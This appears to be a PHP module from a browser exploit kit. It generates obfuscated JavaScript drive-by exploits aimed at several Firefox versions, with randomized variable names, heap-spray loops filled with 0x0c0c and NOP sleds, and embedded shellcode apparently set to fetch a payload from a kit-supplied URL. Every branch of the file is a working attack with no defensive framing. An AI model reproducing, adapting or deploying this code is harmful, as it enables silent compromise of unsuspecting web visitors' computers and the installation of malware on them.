<?php 
$randVar = $GLOBALS["cpFunctions"]->CreateArrayString(rand(10, 30), "100");
if( $browser == "ff" ) 
{
    if( $version == "3.5" ) 
    {
        $strUrl = $GLOBALS["cpXplHelper"]->GetURL("other", $browser, $os, "retval");
        $functionName = $ExploitFunctions[12];
        $replaceFunction = $GLOBALS["cpFunctions"]->RandAlpha(2);
        $eArray[] = "\r\n\t\tvar " . $randVar[4] . " = new Array();\r\n\t\tfunction " . $randVar[5] . "(" . $randVar[6] . ")\r\n\t\t{\r\n\t\t var i;\r\n\t\t var c;\r\n\t\t var " . $randVar[7] . "=\"\";\r\n\t\t for(i=0;i<" . $randVar[6] . ".length;i++)\r\n\t\t  {\r\n\t\t   c=" . $randVar[6] . ".charAt(i);\r\n\t\t   if(c==\"&\" || c==\"?\" || c==\"=\" || c==\"%\" || c==\" \") c = escape(c);\r\n\t\t   " . $randVar[7] . "+=c;\r\n\t\t  }\r\n\t\t return " . $randVar[7] . ";\r\n\t\t}\r\n\t\t \r\n\t\tfunction " . $randVar[8] . "(){\r\n\t\t\t" . $randVar[4] . " = new Array();\r\n\t\t\t" . $randVar[4] . "[0] = new Array();\r\n\t\t\t" . $randVar[4] . "[0][\"str\"] = \"blah\";\r\n\t\t\tvar " . $randVar[10] . " = document.getElementById(\"" . $randVar[12] . "\")\r\n\t\t\tif (document.getElementsByTagName) {\r\n\t\t\t\tvar i=0;\r\n\t\t\t\t" . $randVar[11] . " = " . $randVar[10] . ".getElementsByTagName(\"p\")\r\n\t\t\t\tif (" . $randVar[11] . ".length > 0)  \r\n\t\t\t\twhile (i<" . $randVar[11] . ".length)\r\n\t\t\t\t{\r\n\t\t\t\t\t" . $randVar[13] . " = " . $randVar[11] . "[i].getElementsByTagName(\"font\")\r\n\t\t\t\t\t" . $randVar[4] . "[i+1] = new Array()\r\n\t\t\t\t\tif (" . $randVar[13] . "[0])  \r\n\t\t\t\t\t{\r\n\t\t\t\t\t\t" . $randVar[4] . "[i+1][\"str\"] = " . $randVar[13] . "[0].innerHTML;\r\n\t\t\t\t\t}\r\n\t\t\t\t\ti++\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t\tfunction " . $functionName . "(){\r\n\t\t\tvar obj = document.createElement('div');\r\n\t\t\tdocument.body.appendChild(obj);\r\n\t\t\tobj.id = \"" . $randVar[12] . "\";\r\n\t\t\tobj.innerHTML = \"<p><FONT></FONT></p><p><FONT>Loremipsumdoloregkuw</FONT></p><p><FONT>Loremipsumdoloregkuwiert</FONT></p><p><FONT>Loremikdkw  </FONT></p>\";\r\n\t\t\tvar " . $randVar[0] . " = \"" . $GLOBALS["cpXplHelper"]->GetJSShellcode($strUrl, $replaceFunction) . "\".replace(/" . $replaceFunction . "/g,\"Au\".replace(/A/g,\"B\").replace(/B/g,unescape(\"%25\")));\r\n\t\t\tvar " . $randVar[1] . " = unescape(" . $randVar[0] . ");\r\n\t\t\tvar " . $randVar[2] . " = unescape(\"%u0c0c%u0c0c\");\r\n\r\n\t\t\twhile (" . $randVar[2] . ".length<0x60000)  \r\n\t\t\t{\r\n\t\t\t\t" . $randVar[2] . " += " . $randVar[2] . ";\r\n\t\t\t}\r\n\t\t\t" . $randVar[3] . " = new Array();\r\n\t\t\tfor (i=0; i<600; i++)  \r\n\t\t\t{\r\n\t\t\t\t" . $randVar[3] . "[i] = " . $randVar[2] . " + " . $randVar[1] . ";\r\n\t\t\t}\r\n\t\t\t" . $randVar[8] . "();\r\n\t\t\tvar html = \"\";\r\n\t\t\tfor (i=1;i<" . $randVar[4] . ".length;i++){\r\n\t\t\t\thtml += " . $randVar[5] . "(" . $randVar[4] . "[i][\"str\"])\r\n\t\t\t}\r\n\t\t\t{next}\r\n\t\t}";
    }
    else
    {
        if( $version == "1.1" ) 
        {
            $strUrl = $GLOBALS["cpXplHelper"]->GetURL("other", $browser, $os, "compareTo");
            $functionName = $ExploitFunctions[9];
            $replaceFunction = $GLOBALS["cpFunctions"]->RandAlpha(2);
            $eArray[] = "\r\n\t\tfunction " . $functionName . "(){\r\n\t\t\tlocation.href=\"javascript:void (new InstallVersion());\";\r\n\t\t\t" . $randVar[1] . "();\r\n\t\t\t{next}\r\n\t\t};\r\n\t\tfunction " . $randVar[1] . "() {\r\n\t\t\tvar " . $randVar[2] . "= 0x12000000;\r\n\t\t\tvar " . $randVar[3] . " = \"" . $GLOBALS["cpXplHelper"]->GetJSShellcode($strUrl, $replaceFunction) . "\".replace(/" . $replaceFunction . "/g,\"Au\".replace(/A/g,\"B\").replace(/B/g,unescape(\"%25\")));\r\n\t\t\tvar " . $randVar[4] . " = unescape(" . $randVar[3] . "); \r\n\t\t\tvar " . $randVar[5] . "= 0x400000;\r\n\t\t\tvar " . $randVar[6] . "=" . $randVar[4] . ".length * 2; \r\n\t\t\tvar " . $randVar[7] . "=" . $randVar[5] . "-(" . $randVar[6] . "+0x38);\r\n\t\t\tvar " . $randVar[8] . " = unescape(\"%u002C%u11C0\"); \r\n\t\t\t" . $randVar[8] . " = " . $randVar[10] . "(" . $randVar[8] . "," . $randVar[7] . "); \r\n\t\t\tvar " . $randVar[9] . " = unescape(\"%u002C%u1200\");\r\n\t\t\t" . $randVar[9] . " = " . $randVar[10] . "(" . $randVar[9] . "," . $randVar[7] . ");\r\n\t\t\tvar " . $randVar[11] . " = unescape(\"%u9090%u9090\");\r\n\t\t\t" . $randVar[11] . " = " . $randVar[10] . "(" . $randVar[11] . "," . $randVar[7] . ");\r\n\t\t\t" . $randVar[12] . "=(" . $randVar[2] . "-0x400000)/" . $randVar[5] . ";\r\n\t\t\t" . $randVar[13] . " = new Array();\r\n\t\t\tfor (" . $randVar[14] . "=0;" . $randVar[14] . "<" . $randVar[12] . ";" . $randVar[14] . "++) \r\n\t\t\t{\r\n\t\t\t" . $randVar[13] . "[" . $randVar[14] . "]=(" . $randVar[14] . "%3==0) ? " . $randVar[8] . " + " . $randVar[4] . ": \r\n\t\t\t(" . $randVar[14] . "%3==1) ? " . $randVar[9] . " + " . $randVar[4] . ": " . $randVar[11] . " + " . $randVar[4] . ";\r\n\t\t\t}\r\n\t\t\tvar " . $randVar[15] . " = 0x1180002C;\r\n\t\t\t(new InstallVersion).compareTo(new Number(" . $randVar[15] . " >> 1));\r\n\t\t}\r\n\t\tfunction " . $randVar[10] . "(" . $randVar[16] . ", " . $randVar[7] . ") {\r\n\t\t\twhile (" . $randVar[16] . ".length*2<" . $randVar[7] . ") \r\n\t\t\t{\r\n\t\t\t" . $randVar[16] . "+=" . $randVar[16] . ";\r\n\t\t\t}\r\n\t\t\t" . $randVar[16] . "=" . $randVar[16] . ".substring(0," . $randVar[7] . "/2);\r\n\t\t\treturn " . $randVar[16] . ";\r\n\t\t}";
        }
        else
        {
            if( $version == "1.5" ) 
            {
                $functionName = $ExploitFunctions[9];
                $replaceFunction = $GLOBALS["cpFunctions"]->RandAlpha(2);
                $strUrl = $GLOBALS["cpXplHelper"]->GetURL("other", $browser, $os, "Java Navigator Object");
                $eArray[] = "\r\n\t\tfunction " . $functionName . "(){\r\n\t\t\tvar " . $randVar[0] . " = \"" . $GLOBALS["cpXplHelper"]->GetJSShellcode($strUrl, $replaceFunction) . "\".replace(/" . $replaceFunction . "/g,\"Au\".replace(/A/g,\"B\").replace(/B/g,unescape(\"%25\")));\r\n\t\t\tvar " . $randVar[1] . " = unescape(" . $randVar[0] . ");\r\n\t\t\tvar " . $randVar[2] . " = unescape('%u0800');\r\n\t\t\tvar " . $randVar[3] . " = 0x08000800;\r\n\t\t\tvar " . $randVar[4] . ";\r\n\t\t\tvar " . $randVar[5] . ";\r\n\t\t\tvar " . $randVar[6] . ";\r\n\t\t\tvar " . $randVar[7] . " = '' + navigator.userAgent;\r\n\t\t\tif (" . $randVar[7] . ".indexOf('Windows') != -1) \r\n\t\t\t{\r\n\t\t\t" . $randVar[4] . " = " . $randVar[1] . ";\r\n\t\t\t" . $randVar[5] . " = " . $randVar[3] . ";\r\n\t\t\t" . $randVar[6] . " = " . $randVar[2] . ";\r\n\t\t\t}\r\n\t\t\tvar " . $randVar[8] . " = " . $randVar[6] . ";\r\n\t\t\twhile (" . $randVar[8] . ".length <= 0x400000) " . $randVar[8] . "+=" . $randVar[8] . ";\r\n\t\t\tvar " . $randVar[9] . " = new Array();\r\n\t\t\tfor (var " . $randVar[10] . " =0; " . $randVar[10] . "<36; " . $randVar[10] . "++) {\r\n\t\t\t" . $randVar[9] . "[" . $randVar[10] . "] = \r\n\t\t\t" . $randVar[8] . ".substring(0,  0x100000 - " . $randVar[4] . ".length) + " . $randVar[4] . " +\r\n\t\t\t" . $randVar[8] . ".substring(0,  0x100000 - " . $randVar[4] . ".length) + " . $randVar[4] . " + \r\n\t\t\t" . $randVar[8] . ".substring(0,  0x100000 - " . $randVar[4] . ".length) + " . $randVar[4] . " + \r\n\t\t\t" . $randVar[8] . ".substring(0,  0x100000 - " . $randVar[4] . ".length) + " . $randVar[4] . ";\r\n\t\t\t}\r\n\t\t\tif (window.navigator.javaEnabled) {\r\n\t\t\t\twindow.navigator = (" . $randVar[5] . " / 2);\r\n\t\t\t\ttry {\r\n\t\t\t\tjava.lang.reflect.Runtime.newInstance(\r\n\t\t\t\tjava.lang.Class.forName(\"java.lang.Runtime\"), 0\r\n\t\t\t\t);\r\n\t\t\t\t}catch(e){}\r\n\t\t\t}\r\n\t\t\t{next}\r\n\t\t}";
            }

        }

    }

}

echo "\t\t\t";

